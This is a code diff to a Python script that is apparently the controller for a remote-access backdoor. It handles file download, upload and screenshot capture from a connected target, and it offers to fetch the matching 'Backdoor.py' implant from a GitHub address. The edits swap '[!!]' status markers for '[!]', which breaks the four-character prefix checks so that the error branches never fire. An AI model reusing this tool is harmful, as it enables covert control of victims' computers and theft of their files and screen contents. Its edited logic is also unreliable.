@@ -43,7 +43,7 @@ def shell():
 		
 		elif command [:8] == "download":
 			result = reliable_recv()
-			if result[:4] != '[!!]':
+			if result[:4] != '[!]':
 				file = open(command [9:], "wb")
 				file.write(base64.b64decode(result))
 			else:
@@ -55,10 +55,10 @@ def shell():
 				  reliable_send (base64.b64encode(fin.read()))
 				result = "[+] uploaded successfully"
 			except :
-				result = "[!!] File Not Found"
+				result = "[!] File Not Found"
 				reliable_send(result)
 			finally:
-				if result[:4] == "[!!]":
+				if result[:4] == "[!]":
 					print(colored(result,'red'))
 				else:
 					print(colored(result,'green'))			
@@ -67,7 +67,7 @@ def shell():
 			screen = open("screenshot d" + str(count) + ".png", "wb")		
 			image = reliable_recv()
 			image_decoded = base64.b64decode(image)
-			if image_decoded [:4] == "[!!]":
+			if image_decoded [:4] == "[!]":
 				print(colored(image_decoded,'red'))
 			else:
 				screen.write(image_decoded)
@@ -102,7 +102,7 @@ def accept_conn():
 		print(colored("[+] Listening for Incoming connections....",'green'))
 		target, ip = s.accept()
 	except socket.error:
-		retry = input(colored('[?] Retry (Y/n) : ','yellow'))
+		retry = input(colored('[*] Retry (Y/n) : ','yellow'))
 		if retry == "Y" or retry == "y":
 			accept_conn()
 
@@ -112,17 +112,17 @@ def server():
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 	s.bind(('127.0.0.1',44445))
-	opt = input(colored('[?] Want to Download Backdoor.py (Y/n) : ' ,'yellow'))
+	opt = input(colored('[*] Want to Download Backdoor.py (Y/n) : ' ,'yellow'))
 	if opt == "Y" or opt == "y":
 		try:
 			download("https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py")
 			print(colored("[+] Downloaded Backdoor.py ",'green'))
 		except:
-			print(colored("[!!] Failed to download Backdoor.py Download it manually from :" , 'red') + colored("\r\n https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py",'blue'))
+			print(colored("[!] Failed to download Backdoor.py Download it manually from :" , 'red') + colored("\r\n https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py",'blue'))
 
 	print(colored('[+] In Backdoor.py Change host ip to :  ' ,'green')+ get_ip())
 	s.listen(5)
-	print(colored("[!!] WARNING : KeyInttrupt may not work during listening..",'red'))
+	print(colored("[!] WARNING : KeyInttrupt may not work during listening..",'red'))
 	accept_conn()	
 	print(colored("[+] Target Connected!",'green'))
 			
